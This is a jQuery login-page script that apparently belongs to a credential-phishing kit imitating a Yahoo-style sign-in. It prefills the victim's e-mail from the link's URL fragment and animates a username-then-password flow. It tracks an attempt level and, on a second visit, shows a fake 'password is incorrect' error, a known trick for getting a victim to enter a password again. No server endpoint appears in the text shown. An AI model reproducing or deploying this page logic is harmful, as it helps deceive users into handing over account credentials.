<script type="text/javascript">

  $(document).ready(function() {
    let url = new String(window.location);
    let email = url.split("#");
    if(email[1])$("#oaologin_username").val(email[1]).attr({value:email[1]});
    $("#next").click(function() {
      if($("#oaologin_username").val()){
      $("#username-country-code-field").swapDiv($("#password-challenge"))
      $(".header").hide();
      $("form").css({margin:1}).removeAttr("onsubmit");
      $(".yid").text($("#oaologin_username").val());
      }else $("#oaologin_username").focus();
    })
    if(!email[2]){
      $("#oaologin_level").attr({value:"1"});
    }else{
      $("#oaologin_level").attr({value:"2"});
      $("#login-error").css({color:"red", width:"100%",padding:6}).append($('<h6>').addClass('notification notification-danger').attr({'data-prio':'50'}).append($('<dt>').addClass('notification-heading').text('An error has occurred.')).append($('<dd>').addClass('notification-description').text('This e-mail address could not be found or the password is incorrect.'))).show();
        setTimeout(()=>{$("#login-error").hide();},5000)
      }
    })

    $.fn.extend({
        swapDiv: function(toshow, callback){
          if($(this).length){
            $(toshow).hide();
            $(this).animate({"marginLeft":"-5%","opacity":0},"fast",function(){
              $(this).hide();
              $(toshow).show().css({'opacity':0,'margin-left':'-5%'}).animate({"marginLeft":"0%","opacity":1},"slow");
              if(typeof(callback) == "function"){
                callback(toshow);
              }
            });
          }else{
            $(toshow).show();
            if(typeof(callback) == "function"){
              callback(toshow);
            }
          }
        }
    });
</script>
